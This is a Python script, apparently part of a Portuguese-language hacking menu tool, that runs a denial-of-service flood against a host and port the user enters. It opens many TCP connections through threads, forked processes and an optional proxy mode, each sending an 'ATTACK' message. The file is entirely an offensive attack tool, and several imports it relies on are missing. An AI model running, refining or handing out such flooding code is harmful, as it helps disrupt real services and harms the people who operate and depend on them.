from concurrent.futures import ThreadPoolExecutor
import socket
from Zerasus import menu
import threading
from colores import *
from proxyis import proxis

try:
    select_option()
    select_proxymain()
    option = int(input('-> '))

    select_host()
    host = input(f"-> ")

    select_port()
    porta = int(input(f"-> "))

    select_conections()
    conexao = int(input('-> '))

    select_threads()
    thr = int(input("-> "))

    message = f"ATTACK --> {host} : {porta}"
    ip = socket.gethostbyname(host)

    def dos():

        def ataque():
            os.fork()
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                ddos.connect((host, porta))
                ddos.send(message.encode('ascii'))
                ddos.sendto(message.encode(), (ip, porta))
                ddos.send(message.encode('ascii'))
            except:
                print(message)
            ddos.close()

        if conexao > 0:
            for i in range(conexao):
                f = threading.Thread(target=ataque)
                f.start()
                executor = ThreadPoolExecutor(max_workers=conexao)
                executor.submit(ataque)
        sleep(3)
        menu()

    def dos_proxyes():
        proxis()

        def ataque():
            os.fork()
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                ddos.connect((host, porta))
                ddos.send(message.encode('ascii'))
                ddos.sendto(message.encode(), (ip, porta))
                ddos.send(message.encode('ascii'))
            except:
                print(message)
            ddos.close()

        if conexao > 0:
            for i in range(conexao):
                f = threading.Thread(target=ataque)
                f.start()
                executor = ThreadPoolExecutor(max_workers=conexao)
                executor.submit(ataque)
        sleep(3)
        menu()

    if option == 1:
        dos()
    elif option == 2:
        proxis()
        dos()
    else:
        print(f"{color.RED}Na proxima informe uma opcao!", sleep(3))
        print(f"De volta para o menu!{color.END}", sleep(2))
        menu()
except:
    print(f"{color.RED}Ocorreu um Erro: {Exception}", sleep(3))
    print(f'De volta para o Menu!{color.END}', sleep(2))
    menu()
